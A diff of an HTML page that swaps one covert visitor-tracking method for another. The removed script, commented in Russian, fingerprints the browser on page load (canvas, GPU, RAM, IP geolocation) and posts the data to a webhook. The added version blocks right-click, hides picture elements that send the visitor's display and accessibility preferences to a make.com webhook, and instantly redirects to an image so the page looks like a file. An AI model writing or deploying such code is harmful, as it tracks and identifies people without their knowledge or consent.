@@ -1,65 +1,61 @@
-<script>
-const getFingerprint = () => {
-    const canvas = document.createElement('canvas');
-    const ctx = canvas.getContext('2d');
-    const txt = 'BrowserFingerprint123!';
-    ctx.textBaseline = "top";
-    ctx.font = "14px 'Arial'";
-    ctx.textBaseline = "alphabetic";
-    ctx.fillStyle = "#f60";
-    ctx.fillRect(125,1,62,20);
-    ctx.fillStyle = "#069";
-    ctx.fillText(txt, 2, 15);
-    ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
-    ctx.fillText(txt, 4, 17);
-    return canvas.toDataURL(); // Уникальный хеш на основе рендеринга
-};
+<!DOCTYPE html>
 
-const collectFullData = async () => {
-    try {
-        // 1. Геолокация и IP (внешний сервис)
-        let geo = {};
-        try {
-            const res = await fetch('https://ipapi.co');
-            geo = await res.json();
-        } catch (e) { geo = { error: "Blocker detected" }; }
+<head>
 
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl');
-        const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
+  <script>
+    document.addEventListener('contextmenu', function(event) {
+      event.preventDefault();
+    });
+  </script>
 
-        const info = {
-            timestamp: new Date().toLocaleString(),
-            ip: geo.ip,
-            city: geo.city,
-            country: geo.country_name,
-            isp: geo.org,
-            
-            os: navigator.platform,
-            browser: navigator.userAgent,
-            cores: navigator.hardwareConcurrency || 'N/A',
-            ram: navigator.deviceMemory || 'N/A',
-            gpu: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A',
-            
-            screen: `${window.screen.width}x${window.screen.height}`,
-            touchPoints: navigator.maxTouchPoints,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            
-            canvasHash: getFingerprint().slice(-50) // Хвост base64 строки как ID
-        };
-
-        await fetch('https://brave-meadow-69.webhook.cool', {
-            method: 'POST',
-            mode: 'no-cors',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(info)
-        });
-
-        console.log('KYC Data Sent:', info);
-    } catch (err) {
-        console.error('Data collection failed', err);
+  <style>
+      @media (prefers-color-scheme: dark) {
+    body {
+      background: black;
     }
-};
+      }
+  </style>
 
-window.addEventListener('load', collectFullData);
-</script>
+  <meta http-equiv="refresh" content="0.016; https://i.ibb.co/Q75T7ZNg/file-icon.png">
+
+</head>
+
+<body>
+
+  <picture style="display:none">
+    <source https://hook.eu1.make.com/l7ur6c8fnms2k6gvx1xa3q7c3hmqievj/?theme=dark"  media="(prefers-color-scheme: dark)">
+    <source srcset="https://hook.eu1.make.com/l7ur6c8fnms2k6gvx1xa3q7c3hmqievj/?theme=light" media="(prefers-color-scheme: light)">
+    <source srcset="https://hook.eu1.make.com/l7ur6c8fnms2k6gvx1xa3q7c3hmqievj/?theme=no_preference" media="(prefers-color-scheme: no-preference)">
+    <img src="https://hook.eu1.make.com/l7ur6c8fnms2k6gvx1xa3q7c3hmqievj/?theme=unknown_prob_dark" alt="">
+  </picture>
+
+  <picture style="display:none">
+    <source srcset="https://hook.eu1.make.com/l7ur6c8fnms2k6gvx1xa3q7c3hmqievj/?animations=reduced"  media="(prefers-reduced-motion: reduce)">
+    <source srcset="https://hook.eu1.make.com/l7ur6c8fnms2k6gvx1xa3q7c3hmqievj/?animations=no_preference"  media="(prefers-reduced-motion: no-preference)">
+    <img src="https://hook.eu1.make.com/l7ur6c8fnms2k6gvx1xa3q7c3hmqievj/?animations=unknown" alt="">
+  </picture>
+
+  <picture style="display:none">
+    <source srcset="https://hook.eu1.make.com/l7ur6c8fnms2k6gvx1xa3q7c3hmqievj/?contrast=increased"  media="(prefers-contrast: more)">
+    <source srcset="https://hook.eu1.make.com/l7ur6c8fnms2k6gvx1xa3q7c3hmqievj/?contrast=decreased"  media="(prefers-contrast: less)">
+    <source srcset="https://hook.eu1.make.com/l7ur6c8fnms2k6gvx1xa3q7c3hmqievj/?contrast=custom"  media="(prefers-contrast: custom)">
+    <source srcset="https://hook.eu1.make.com/l7ur6c8fnms2k6gvx1xa3q7c3hmqievj/?contrast=no_preference"  media="(prefers-contrast: no-preference)">
+    <img src="https://hook.eu1.make.com/l7ur6c8fnms2k6gvx1xa3q7c3hmqievj/?contrast=unknown" alt="">
+  </picture>
+
+  <picture style="display:none">
+    <source srcset="https://hook.eu1.make.com/l7ur6c8fnms2k6gvx1xa3q7c3hmqievj/?screen_quality=normal-srgb"  media="(color-gamut: srgb)">
+    <source srcset="https://hook.eu1.make.com/l7ur6c8fnms2k6gvx1xa3q7c3hmqievj/?screen_quality=advanced-p3"  media="(color-gamut: p3)">
+    <source srcset="https://hook.eu1.make.com/l7ur6c8fnms2k6gvx1xa3q7c3hmqievj/?screen_quality=ultra-rec2020"  media="(color-gamut: rec2020)">
+    <img src="https://hook.eu1.make.com/l7ur6c8fnms2k6gvx1xa3q7c3hmqievj/?screen_quality=unknown" alt="">
+  </picture>
+
+  <picture style="display:none">
+    <source srcset="https://hook.eu1.make.com/l7ur6c8fnms2k6gvx1xa3q7c3hmqievj/?is_hdr_on=yes"  media="(dynamic-range: high)">
+    <source srcset="https://hook.eu1.make.com/l7ur6c8fnms2k6gvx1xa3q7c3hmqievj/?is_hdr_on=no"  media="(dynamic-range: standard)">
+    <img src="https://hook.eu1.make.com/l7ur6c8fnms2k6gvx1xa3q7c3hmqievj/?is_hdr_on=unknown" alt="">
+  </picture>
+
+</body>
+
+</html>
